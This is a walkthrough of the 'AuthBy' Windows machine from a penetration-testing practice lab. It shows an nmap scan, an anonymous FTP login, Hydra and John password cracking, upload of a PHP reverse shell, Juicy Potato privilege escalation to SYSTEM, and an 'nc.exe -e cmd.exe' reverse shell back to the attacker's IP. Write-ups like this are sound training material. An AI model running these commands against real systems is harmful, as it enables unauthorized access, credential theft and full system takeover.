# ​Proving Grounds - Intermediate Windows - AuthBy


- **Points** 20
- **Level** Intermediate
- **Number of Flags** 2
- **Vector Type** FTP, Local
- **IP** 192.168.55.46
- **AuthBy OS Credentials** `apache / 1q2w3e4r5t6y7u`
-  **Job Roles** Network Penetration Testers
- **Skills** Enumeration, Password Attacks

---

## About

Exploit the target through Anonymous FTP, deducing the admin credentials to gain access and escalate privileges. This exercise enhances your skills in FTP exploitation and privilege escalation techniques.

---

## Summary

This lab involves exploiting an anonymous FTP server to gain initial access. Learners will enumerate the target to discover credentials for an admin FTP account, then upload a malicious PHP reverse shell for remote execution. The final step involves using the Task Scheduler Privilege Escalation exploit to gain administrative access on the target. This lab focuses on enumeration, credential discovery, web shell deployment, and privilege escalation.

---

## Learning Objectives

**After completion of this lab, learners will be able to:**

- Enumerate the target system to identify an open anonymous FTP service.
- Discover and utilize admin FTP credentials to access sensitive files.
- Upload and execute a PHP reverse shell to gain remote access.
- Enumerate the operating system and identify privilege escalation opportunities.
- Exploit the Task Scheduler Privilege Escalation vulnerability to achieve administrative access.

---

## Recon

- NMap Scan

```bash
nmap -p- --min-rate 10000  -sS -sV -sS -A 192.168.55.46
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 12:20 UTC
Nmap scan report for 192.168.55.46
Host is up (0.00047s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Jul 17 19:21 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 02  2024 accounts
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin    zFTPServer admin
3389/tcp open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2024-08-01T10:50:21
|_Not valid after:  2025-01-31T10:50:21
|_ssl-date: 2025-07-17T12:21:37+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2025-07-17T12:21:32+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone
Running: Microsoft Windows Phone
OS CPE: cpe:/o:microsoft:windows
OS details: Microsoft Windows Phone 7.5 or 8.0
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.24 seconds
```

---

## Port 21 Exploitation

- Port 21 is for zFTPServer 6.0.
- NMap shows it is vulnerable to Anonymous login.

```bash
ftp 192.168.55.46
Connected to 192.168.55.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
Name (192.168.55.46:kali): anonymous
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

---

## Information Gathering form ftp connection

- If we check inside **accounts** folder we get two usernames inside it.

```bash
ftp> ls accounts
229 Entering Extended Passive Mode (|||2050|)
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Aug 02  2024 backup
----------   1 root     root          764 Aug 02  2024 acc[Offsec].uac
----------   1 root     root         1030 Jul 17 19:21 acc[anonymous].uac
----------   1 root     root          926 Aug 02  2024 acc[admin].uac
226 Closing data connection.

```

---

## Bruteforcing ftp with extra usernames

- Saving two usernames inside users.txt

```bash
echo "Offsec\nadmin" >users.txt 
```

- Using hydra to bruteforce ftp

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt.gz ftp://192.168.55.46 -u
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-17 14:22:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking ftp://192.168.55.46:21/
[21][ftp] host: 192.168.55.46   login: admin   password: admin
```

- We got valid credential for user **admin**. It is **admin:admin**.

---

## Validating ftp credentials

- Using brute-forced Credential

```bash
ftp admin@192.168.55.46
Connected to 192.168.55.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

---

## Information Gathering admin ftp

- There are **.htpasswd** file with encrypted password.

```bash
ftp> ls
229 Entering Extended Passive Mode (|||2053|)
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> less .htpasswd
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

---

## Decryption of the password using john

- Downloaded the **.htpasswd** file

```bash
ftp> get .htpasswd
local: .htpasswd remote: .htpasswd
229 Entering Extended Passive Mode (|||2055|)
150 File status okay; about to open data connection.
100% |*************************************************************|    45      935.00 KiB/s    00:00 ETA
226 Closing data connection.
45 bytes received in 00:00 (1.07 KiB/s)
ftp> 
```

- Change file name

```bash
mv .htpasswd offsec.txt
```

- Bruteforced with john.

```bash
john --wordlist=rockyou.txt offsec.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
elite            (offsec)     
1g 0:00:00:00 DONE (2025-07-17 13:20) 6.250g/s 158400p/s 158400c/s 158400C/s lovestruck..260989
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                
```

- Cracked credential is **offsec:elite**.

---

## Initial Access

- As we have server access with **admin:admin** credentials, we can upload our shell using ftp.
- Downloaded php reverse shell for windows and modified ip port. eg. https://github.com/ZishanAdThandar/pentest/tree/main/shell
- Started netcat listener

```bash
nc -lvnp 1337
listening on [any] 1337
```

- Upload the shell using ftp server as admin user.

```bash
ftp admin@192.168.55.46
Connected to 192.168.55.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put hack.php 
local: hack.php remote: hack.php
229 Entering Extended Passive Mode (|||2048|)
150 File status okay; about to open data connection.
100% |*************************************************************| 34926       37.38 MiB/s    00:00 ETA
226 Closing data connection.
34926 bytes sent in 00:00 (804.60 KiB/s)
ftp> 

```

- Port 242 is hosting the server with cracked credential **offsec:elite**.
- So, we can curl the shell with authentication details to get reverse shell

```bash
curl -u 'offsec:elite' -X GET http://192.168.55.46:242/hack.php
```

- We will get reverse shell in our netcat listener.

```bash
nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.49.55] from (UNKNOWN) [192.168.55.46] 49171
SOCKET: Shell has connected!
SOCKET: Shell ready. Type commands.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\bin\apache\Apache2.2.21>id
id

C:\wamp\bin\apache\Apache2.2.21>'id' is not recognized as an internal or external command,
operable program or batch file.



C:\wamp\bin\apache\Apache2.2.21>
C:\wamp\bin\apache\Apache2.2.21>whoami
whoami
livda\apache

```

---

## User Flag Extraction local.txt

- Now we can just navigate to **C:\Users\apache\Desktop** and read the flag inside **local.txt** file.

```bash
C:\Users\apache\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\Users\apache\Desktop

07/09/2020  11:05 AM    <DIR>          .
07/09/2020  11:05 AM    <DIR>          ..
07/17/2025  08:46 AM                34 local.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,031,880,192 bytes free

C:\Users\apache\Desktop>type local.txt
type local.txt
9cd1c822f2********d8c8d30b8e0
```

---

## Privilege Escalation

- Checking for user privilege shows **SeImpersonatePrivilege** is enabled.

```bash
C:\wamp\bin\apache\Apache2.2.21>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

**Notes**: 
SeImpersonatePrivilege — Enabled. 
This is the exact privilege required to perform several local privilege escalation (LPE) attacks like: Juicy Potato, Rogue Potato, PrintSpoofer, Potato.Ng, Sweet Potato, GodPotato, TokenKidnap (NTLM relay-style privilege escalation). 
These tools abuse Windows COM or named pipe impersonation mechanisms to escalate from low-privileged user to SYSTEM.

- Tried to the juice potato exploit. But, **failed** because the system is x86.
- So, downloaded x86 version of juice potato on the server.

```powershell

(New-Object System.Net.WebClient).DownloadFile("https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe", "jp.exe")
```

- Extracted CLSID to use in Juicy Potato Exploit using command below

```powershell

for /f "tokens=*" %A in ('reg query HKCR\CLSID 2^>nul') do @for /f "tokens=3" %B in ('reg query "%A" /v AppID 2^>nul ^| find /i "AppID"') do @for /f "tokens=3" %C in ('reg query HKCR\AppID\%B /v LocalService 2^>nul ^| find /i "LocalService"') do @echo CLSID: %A ^| AppID: %B ^| LocalService: %C
```

- Verified exploit

```bash
C:\Users\apache\Desktop>jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/k whoami > C:\Users\Public\whoami.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/k whoami > C:\Users\Public\whoami.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
Testing {69AD4AEE-51BE-439b-A92C-86AE490E8B30} 1337
....
[+] authresult 0
{69AD4AEE-51BE-439b-A92C-86AE490E8B30};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\apache\Desktop>type C:\Users\Public\whoami.txt
type C:\Users\Public\whoami.txt
nt authority\system

```

---

## Root Flag Extraction proof.txt

- Now we can just navigate to **C:\Users\apache\Desktop** and read the flag inside **local.txt** file.

```bash
C:\Users\apache\Desktop>jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "type C:\Users\Administrator\Desktop\proof.txt > C:\Users\Public\proof.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "type C:\Users\Administrator\Desktop\proof.txt > C:\Users\Public\proof.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
Testing {69AD4AEE-51BE-439b-A92C-86AE490E8B30} 1337
...........................................
C:\Users\apache\Desktop>jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "type C:\Users\Administrator\Desktop\proof.txt > C:\Users\Public\proof.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "type C:\Users\Administrator\Desktop\proof.txt > C:\Users\Public\proof.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
Testing {69AD4AEE-51BE-439b-A92C-86AE490E8B30} 1337
....
[+] authresult 0
{69AD4AEE-51BE-439b-A92C-86AE490E8B30};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\apache\Desktop>type C:\Users\Public\proof.txt
type C:\Users\Public\proof.txt
cddd3973c71*****3710219e36f

```

---
---

## Beyond root

- Getting Administrator shell
- Upload netcat using python server. https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe
- Start a netcat listner on any port
- Then run huicy potato command to get shell 

```bash
jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\apache\Desktop\nc.exe -e cmd.exe 192.168.49.55 9999" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
```

- Will get a Administrator shell

```bash
nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.49.55] from (UNKNOWN) [192.168.55.46] 50114
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\proof.txt
cddd3973c7*****1163710219e36f

C:\Windows\system32>
```

---

## Author

[Zishan Ahamed Thandar](https://zishanadthandar.github.io)
